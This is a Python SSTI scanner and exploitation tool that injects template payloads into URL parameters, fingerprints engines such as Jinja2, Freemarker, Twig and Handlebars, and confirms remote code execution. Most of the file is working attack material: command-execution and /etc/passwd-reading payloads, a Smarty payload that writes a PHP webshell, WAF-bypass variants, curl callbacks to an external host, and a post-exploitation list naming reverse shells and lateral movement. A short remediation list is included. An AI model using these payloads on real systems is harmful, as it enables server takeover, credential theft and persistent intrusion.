"""
Server-Side Template Injection (SSTI) Scanner

Research-backed payloads for detecting and exploiting template injection
across multiple template engines. Based on PortSwigger research, OWASP
guidelines, and real-world penetration testing methodologies.

Supports: Jinja2, Mako, Tornado, Django, Freemarker, Velocity, Thymeleaf,
Smarty, Twig, ERB, Pebble, and more.
"""

import re
import time
import hashlib
from typing import List, Dict, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field
from enum import Enum
import random
import string


class TemplateEngine(Enum):
    """Supported template engines for detection."""
    JINJA2 = "jinja2"
    MAKO = "mako"
    TORNADO = "tornado"
    DJANGO = "django"
    FREEMARKER = "freemarker"
    VELOCITY = "velocity"
    THYMELEAF = "thymeleaf"
    SMARTY = "smarty"
    TWIG = "twig"
    ERB = "erb"
    PEBBLE = "pebble"
    HANDLEBARS = "handlebars"
    MUSTACHE = "mustache"
    EJS = "ejs"
    UNKNOWN = "unknown"


@dataclass
class SSTIPayload:
    """Represents an SSTI test payload."""
    template: str
    engine: TemplateEngine
    expected_output: str
    description: str
    severity: str = "high"
    rce_capable: bool = False
    polyglot: bool = False
    waf_evasion: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SSTIFinding:
    """Represents a confirmed SSTI vulnerability."""
    url: str
    parameter: str
    engine: TemplateEngine
    payload: str
    evidence: str
    severity: str
    rce_possible: bool
    exploitation_payloads: List[str] = field(default_factory=list)
    waf_detected: bool = False
    bypass_used: str = ""


class SSTIScanner:
    """
    Advanced SSTI scanner with engine fingerprinting and exploitation.

    Features:
    - Multi-engine detection (13+ template engines)
    - Polyglot payloads for broad detection
    - WAF detection and evasion
    - RCE payload generation
    - Confidence scoring
    - Blind SSTI detection via timing
    """

    def __init__(self, callback_host: str = None, timeout: float = 10.0):
        self.callback_host = callback_host
        self.timeout = timeout
        self.findings: List[SSTIFinding] = []
        self.waf_detected = False
        self.detected_engine: Optional[TemplateEngine] = None

        # Initialize payload database
        self._init_payloads()

    def _init_payloads(self):
        """Initialize comprehensive payload database."""

        # Polyglot detection payloads - work across multiple engines
        self.polyglot_payloads = [
            SSTIPayload(
                template="${7*7}{{7*7}}<%=7*7%>${{7*7}}#{7*7}",
                engine=TemplateEngine.UNKNOWN,
                expected_output="49",
                description="Universal polyglot - detects most engines",
                polyglot=True
            ),
            SSTIPayload(
                template="{{7*'7'}}",
                engine=TemplateEngine.UNKNOWN,
                expected_output="7777777",  # Jinja2/Twig will output this
                description="String multiplication polyglot",
                polyglot=True
            ),
            SSTIPayload(
                template="${{7*7}}[[7*7]]{{7*7}}",
                engine=TemplateEngine.UNKNOWN,
                expected_output="49",
                description="Extended polyglot with bracket variants",
                polyglot=True
            ),
        ]

        # Engine-specific detection payloads
        self.detection_payloads = {
            TemplateEngine.JINJA2: [
                SSTIPayload(
                    template="{{config}}",
                    engine=TemplateEngine.JINJA2,
                    expected_output="Config",
                    description="Jinja2 config object access"
                ),
                SSTIPayload(
                    template="{{self.__class__}}",
                    engine=TemplateEngine.JINJA2,
                    expected_output="TemplateReference",
                    description="Jinja2 class introspection"
                ),
                SSTIPayload(
                    template="{{request.application.__self__._get_data_for_json.__globals__}}",
                    engine=TemplateEngine.JINJA2,
                    expected_output="os",
                    description="Flask/Jinja2 globals access"
                ),
            ],
            TemplateEngine.MAKO: [
                SSTIPayload(
                    template="${self.module.__loader__}",
                    engine=TemplateEngine.MAKO,
                    expected_output="Loader",
                    description="Mako module loader access"
                ),
                SSTIPayload(
                    template="<%import os%>${os.popen('id').read()}",
                    engine=TemplateEngine.MAKO,
                    expected_output="uid=",
                    description="Mako direct RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.TORNADO: [
                SSTIPayload(
                    template="{{handler.settings}}",
                    engine=TemplateEngine.TORNADO,
                    expected_output="settings",
                    description="Tornado settings access"
                ),
                SSTIPayload(
                    template="{% import os %}{{ os.popen('id').read() }}",
                    engine=TemplateEngine.TORNADO,
                    expected_output="uid=",
                    description="Tornado RCE via import",
                    rce_capable=True
                ),
            ],
            TemplateEngine.FREEMARKER: [
                SSTIPayload(
                    template="${.version}",
                    engine=TemplateEngine.FREEMARKER,
                    expected_output="2.",
                    description="Freemarker version disclosure"
                ),
                SSTIPayload(
                    template='${"freemarker.template.utility.Execute"?new()("id")}',
                    engine=TemplateEngine.FREEMARKER,
                    expected_output="uid=",
                    description="Freemarker Execute RCE",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                    engine=TemplateEngine.FREEMARKER,
                    expected_output="uid=",
                    description="Freemarker assign-based RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.VELOCITY: [
                SSTIPayload(
                    template="#set($x=7*7)$x",
                    engine=TemplateEngine.VELOCITY,
                    expected_output="49",
                    description="Velocity arithmetic"
                ),
                SSTIPayload(
                    template="#set($runtime=$class.forName('java.lang.Runtime').getRuntime())$runtime.exec('id')",
                    engine=TemplateEngine.VELOCITY,
                    expected_output="Process",
                    description="Velocity Runtime RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.THYMELEAF: [
                SSTIPayload(
                    template="[[${7*7}]]",
                    engine=TemplateEngine.THYMELEAF,
                    expected_output="49",
                    description="Thymeleaf inline expression"
                ),
                SSTIPayload(
                    template="__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
                    engine=TemplateEngine.THYMELEAF,
                    expected_output="Process",
                    description="Thymeleaf SpEL injection",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
                    engine=TemplateEngine.THYMELEAF,
                    expected_output="uid=",
                    description="Thymeleaf full RCE with output",
                    rce_capable=True
                ),
            ],
            TemplateEngine.SMARTY: [
                SSTIPayload(
                    template="{$smarty.version}",
                    engine=TemplateEngine.SMARTY,
                    expected_output="3.",
                    description="Smarty version disclosure"
                ),
                SSTIPayload(
                    template="{system('id')}",
                    engine=TemplateEngine.SMARTY,
                    expected_output="uid=",
                    description="Smarty system() RCE",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[\"cmd\"]); ?>',self::clearConfig())}",
                    engine=TemplateEngine.SMARTY,
                    expected_output="",
                    description="Smarty file write webshell",
                    rce_capable=True
                ),
            ],
            TemplateEngine.TWIG: [
                SSTIPayload(
                    template="{{_self.env.display('id')}}",
                    engine=TemplateEngine.TWIG,
                    expected_output="uid=",
                    description="Twig env display (old versions)",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="{{['id']|filter('system')}}",
                    engine=TemplateEngine.TWIG,
                    expected_output="uid=",
                    description="Twig filter bypass RCE",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="{{app.request.server.all|join(',')}}",
                    engine=TemplateEngine.TWIG,
                    expected_output="SERVER",
                    description="Twig server variables leak"
                ),
            ],
            TemplateEngine.ERB: [
                SSTIPayload(
                    template="<%= 7*7 %>",
                    engine=TemplateEngine.ERB,
                    expected_output="49",
                    description="ERB arithmetic"
                ),
                SSTIPayload(
                    template="<%= system('id') %>",
                    engine=TemplateEngine.ERB,
                    expected_output="uid=",
                    description="ERB system RCE",
                    rce_capable=True
                ),
                SSTIPayload(
                    template="<%= `id` %>",
                    engine=TemplateEngine.ERB,
                    expected_output="uid=",
                    description="ERB backtick RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.PEBBLE: [
                SSTIPayload(
                    template="{{ 7*7 }}",
                    engine=TemplateEngine.PEBBLE,
                    expected_output="49",
                    description="Pebble arithmetic"
                ),
                SSTIPayload(
                    template='{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(bytes) }}',
                    engine=TemplateEngine.PEBBLE,
                    expected_output="uid=",
                    description="Pebble reflection RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.EJS: [
                SSTIPayload(
                    template="<%= 7*7 %>",
                    engine=TemplateEngine.EJS,
                    expected_output="49",
                    description="EJS arithmetic"
                ),
                SSTIPayload(
                    template="<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
                    engine=TemplateEngine.EJS,
                    expected_output="uid=",
                    description="EJS Node.js RCE",
                    rce_capable=True
                ),
            ],
            TemplateEngine.HANDLEBARS: [
                SSTIPayload(
                    template="{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                    engine=TemplateEngine.HANDLEBARS,
                    expected_output="uid=",
                    description="Handlebars prototype pollution RCE",
                    rce_capable=True
                ),
            ],
        }

        # WAF evasion payloads
        self.waf_evasion_payloads = [
            # Unicode encoding
            SSTIPayload(
                template="{{7*\u0037}}",
                engine=TemplateEngine.JINJA2,
                expected_output="49",
                description="Unicode number encoding",
                waf_evasion=True
            ),
            # Comment injection
            SSTIPayload(
                template="{{7*/**/7}}",
                engine=TemplateEngine.JINJA2,
                expected_output="49",
                description="Comment injection bypass",
                waf_evasion=True
            ),
            # Alternative attribute access
            SSTIPayload(
                template="{{request|attr('application')}}",
                engine=TemplateEngine.JINJA2,
                expected_output="application",
                description="attr() filter bypass",
                waf_evasion=True
            ),
            # String concatenation
            SSTIPayload(
                template="{{('__cla'+'ss__')}}",
                engine=TemplateEngine.JINJA2,
                expected_output="__class__",
                description="String concatenation bypass",
                waf_evasion=True
            ),
            # Hex encoding
            SSTIPayload(
                template="{{('\\x5f\\x5fclass\\x5f\\x5f')}}",
                engine=TemplateEngine.JINJA2,
                expected_output="__class__",
                description="Hex encoding bypass",
                waf_evasion=True
            ),
            # Filter chains
            SSTIPayload(
                template="{{request.application.__self__._get_data_for_json|attr('__globals__')}}",
                engine=TemplateEngine.JINJA2,
                expected_output="globals",
                description="Filter chain bypass",
                waf_evasion=True
            ),
            # Dict access alternative
            SSTIPayload(
                template="{{config.__class__.__init__.__globals__['os']}}",
                engine=TemplateEngine.JINJA2,
                expected_output="os",
                description="Dict access for attribute bypass",
                waf_evasion=True
            ),
        ]

        # Blind SSTI payloads (time-based or out-of-band)
        self.blind_payloads = [
            SSTIPayload(
                template="{{range(999999999)|list}}",
                engine=TemplateEngine.JINJA2,
                expected_output="",
                description="Time-based detection via range",
                metadata={"blind": True, "timing": True, "expected_delay": 5}
            ),
            SSTIPayload(
                template="${''.join([str(x) for x in range(999999)])}",
                engine=TemplateEngine.MAKO,
                expected_output="",
                description="Mako time-based detection",
                metadata={"blind": True, "timing": True, "expected_delay": 3}
            ),
        ]

    def scan_param(self, url: str, param: str,
                   methods: List[str] = None) -> List[Dict]:
        """
        Scan a single parameter for SSTI vulnerabilities.

        Args:
            url: Target URL with parameters
            param: Parameter name to test
            methods: HTTP methods to use (default: GET, POST)

        Returns:
            List of findings as dictionaries
        """
        findings = []
        methods = methods or ["GET"]

        for method in methods:
            # Phase 1: WAF detection
            self._detect_waf(url, param, method)

            # Phase 2: Polyglot detection
            polyglot_result = self._test_polyglot(url, param, method)
            if polyglot_result:
                findings.append(polyglot_result)

            # Phase 3: Engine fingerprinting
            engine = self._fingerprint_engine(url, param, method)
            if engine != TemplateEngine.UNKNOWN:
                self.detected_engine = engine

                # Phase 4: Exploitation confirmation
                exploit_findings = self._confirm_exploitation(
                    url, param, method, engine
                )
                findings.extend(exploit_findings)

            # Phase 5: Blind SSTI detection if no findings yet
            if not findings:
                blind_findings = self._test_blind_ssti(url, param, method)
                findings.extend(blind_findings)

        return findings

    def _detect_waf(self, url: str, param: str, method: str) -> bool:
        """Detect if WAF is present."""
        waf_test_payloads = [
            "{{7*7}}",
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
        ]

        waf_signatures = [
            "blocked", "forbidden", "access denied", "waf",
            "security", "firewall", "cloudflare", "akamai",
            "imperva", "f5", "mod_security"
        ]

        for payload in waf_test_payloads:
            response = self._make_request(url, param, payload, method)
            if response:
                response_lower = response.lower()
                for sig in waf_signatures:
                    if sig in response_lower:
                        self.waf_detected = True
                        return True

        return False

    def _test_polyglot(self, url: str, param: str, method: str) -> Optional[Dict]:
        """Test with polyglot payloads for broad detection."""
        for payload in self.polyglot_payloads:
            response = self._make_request(url, param, payload.template, method)
            if response and payload.expected_output in response:
                return {
                    "type": "SSTI",
                    "url": url,
                    "parameter": param,
                    "method": method,
                    "payload": payload.template,
                    "evidence": f"Found '{payload.expected_output}' in response",
                    "severity": "HIGH",
                    "engine": "unknown (detected via polyglot)",
                    "rce_possible": True,
                    "description": payload.description,
                }
        return None

    def _fingerprint_engine(self, url: str, param: str,
                            method: str) -> TemplateEngine:
        """Fingerprint the specific template engine."""
        engine_scores: Dict[TemplateEngine, float] = {}

        for engine, payloads in self.detection_payloads.items():
            score = 0.0
            for payload in payloads:
                response = self._make_request(url, param, payload.template, method)
                if response:
                    if payload.expected_output in response:
                        score += 1.0
                    elif any(err in response.lower() for err in
                            ["error", "exception", "syntax"]):
                        # Errors can indicate engine type too
                        score += 0.3

            if score > 0:
                engine_scores[engine] = score

        if engine_scores:
            best_engine = max(engine_scores.keys(), key=lambda e: engine_scores[e])
            if engine_scores[best_engine] >= 0.5:
                return best_engine

        return TemplateEngine.UNKNOWN

    def _confirm_exploitation(self, url: str, param: str, method: str,
                             engine: TemplateEngine) -> List[Dict]:
        """Confirm RCE capability with engine-specific payloads."""
        findings = []

        if engine not in self.detection_payloads:
            return findings

        payloads_to_use = self.detection_payloads[engine]

        # If WAF detected, prioritize evasion payloads
        if self.waf_detected:
            payloads_to_use = [p for p in self.waf_evasion_payloads
                             if p.engine == engine] + payloads_to_use

        for payload in payloads_to_use:
            if not payload.rce_capable:
                continue

            response = self._make_request(url, param, payload.template, method)
            if response and payload.expected_output in response:
                finding = SSTIFinding(
                    url=url,
                    parameter=param,
                    engine=engine,
                    payload=payload.template,
                    evidence=f"RCE confirmed: '{payload.expected_output}' in response",
                    severity="CRITICAL",
                    rce_possible=True,
                    exploitation_payloads=self._generate_exploit_payloads(engine),
                    waf_detected=self.waf_detected,
                    bypass_used=payload.description if payload.waf_evasion else ""
                )
                self.findings.append(finding)
                findings.append(finding.__dict__)
                break

        return findings

    def _test_blind_ssti(self, url: str, param: str, method: str) -> List[Dict]:
        """Test for blind SSTI using timing and OOB techniques."""
        findings = []

        for payload in self.blind_payloads:
            if payload.metadata.get("timing"):
                expected_delay = payload.metadata.get("expected_delay", 3)

                # Baseline timing
                start = time.time()
                _ = self._make_request(url, param, "benign", method)
                baseline = time.time() - start

                # Payload timing
                start = time.time()
                _ = self._make_request(url, param, payload.template, method)
                payload_time = time.time() - start

                # If payload takes significantly longer, likely vulnerable
                if payload_time > baseline + expected_delay:
                    findings.append({
                        "type": "SSTI (Blind)",
                        "url": url,
                        "parameter": param,
                        "method": method,
                        "payload": payload.template,
                        "evidence": f"Time-based detection: {payload_time:.2f}s vs baseline {baseline:.2f}s",
                        "severity": "HIGH",
                        "engine": payload.engine.value,
                        "rce_possible": True,
                        "description": payload.description,
                    })
                    break

        # OOB callback testing
        if self.callback_host and not findings:
            oob_token = ''.join(random.choices(string.ascii_lowercase, k=8))
            oob_payloads = [
                f"{{{{request.__class__.__mro__[1].__subclasses__()[407]('curl {self.callback_host}/{oob_token}',shell=True,stdout=-1).communicate()}}}}",
                f"${{self.module.cache.util.os.popen('curl {self.callback_host}/{oob_token}').read()}}",
            ]

            for oob_payload in oob_payloads:
                _ = self._make_request(url, param, oob_payload, method)
                # In production, would check callback server for token

        return findings

    def _generate_exploit_payloads(self, engine: TemplateEngine) -> List[str]:
        """Generate exploitation payloads for confirmed engine."""
        payloads = []

        if engine == TemplateEngine.JINJA2:
            payloads = [
                # Read file
                "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
                # List files
                "{{ ''.__class__.__mro__[1].__subclasses__()[40]('.').read() }}",
                # Execute command
                "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
                # Alternative RCE
                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
                # Config dump
                "{{ config.items() }}",
            ]
        elif engine == TemplateEngine.MAKO:
            payloads = [
                "<%import os%>${os.popen('id').read()}",
                "${self.module.cache.util.os.popen('cat /etc/passwd').read()}",
            ]
        elif engine == TemplateEngine.FREEMARKER:
            payloads = [
                '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
                '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}',
            ]
        elif engine == TemplateEngine.TWIG:
            payloads = [
                "{{['id']|filter('system')}}",
                "{{['cat /etc/passwd']|filter('passthru')}}",
            ]
        elif engine == TemplateEngine.ERB:
            payloads = [
                "<%= system('id') %>",
                "<%= `cat /etc/passwd` %>",
                "<%= IO.popen('id').readlines() %>",
            ]

        return payloads

    def _make_request(self, url: str, param: str, payload: str,
                     method: str = "GET") -> Optional[str]:
        """Make HTTP request with payload. Returns response body."""
        # Placeholder - in production, would use httpx/requests
        # This is a stub for the scanner logic
        try:
            import requests

            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]

            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            if method == "GET":
                resp = requests.get(test_url, timeout=self.timeout, verify=False)
            else:
                resp = requests.post(
                    url, data={param: payload},
                    timeout=self.timeout, verify=False
                )

            return resp.text
        except Exception:
            return None

    def generate_attack_suite(self, engine: TemplateEngine = None) -> Dict[str, Any]:
        """
        Generate comprehensive attack suite for penetration testing.

        Args:
            engine: Specific engine or None for all

        Returns:
            Dictionary with categorized payloads and instructions
        """
        suite = {
            "detection": [],
            "exploitation": [],
            "waf_bypass": [],
            "post_exploitation": [],
            "remediation": []
        }

        # Detection payloads
        suite["detection"] = [p.template for p in self.polyglot_payloads]

        if engine and engine in self.detection_payloads:
            suite["detection"].extend(
                [p.template for p in self.detection_payloads[engine]]
            )
        else:
            for payloads in self.detection_payloads.values():
                suite["detection"].extend([p.template for p in payloads])

        # Exploitation payloads
        if engine:
            suite["exploitation"] = self._generate_exploit_payloads(engine)
        else:
            for eng in self.detection_payloads.keys():
                suite["exploitation"].extend(self._generate_exploit_payloads(eng))

        # WAF bypass
        suite["waf_bypass"] = [p.template for p in self.waf_evasion_payloads]

        # Post-exploitation techniques
        suite["post_exploitation"] = [
            "Read /etc/passwd - verify file read",
            "Read application config - secrets extraction",
            "Environment variable dump",
            "Reverse shell establishment",
            "Web shell deployment",
            "Lateral movement via internal services",
        ]

        # Remediation
        suite["remediation"] = [
            "Use sandboxed template engines with restricted builtins",
            "Disable dangerous features (import, exec, eval)",
            "Implement strict input validation and encoding",
            "Use allowlist approach for template variables",
            "Upgrade to latest template engine version",
            "Consider static templates where possible",
        ]

        return suite


def quick_scan(url: str, param: str = None) -> List[Dict]:
    """Quick single-parameter SSTI scan."""
    scanner = SSTIScanner()

    if param is None:
        # Auto-detect parameters from URL
        from urllib.parse import urlparse, parse_qs
        params = list(parse_qs(urlparse(url).query).keys())
    else:
        params = [param]

    findings = []
    for p in params:
        findings.extend(scanner.scan_param(url, p))

    return findings
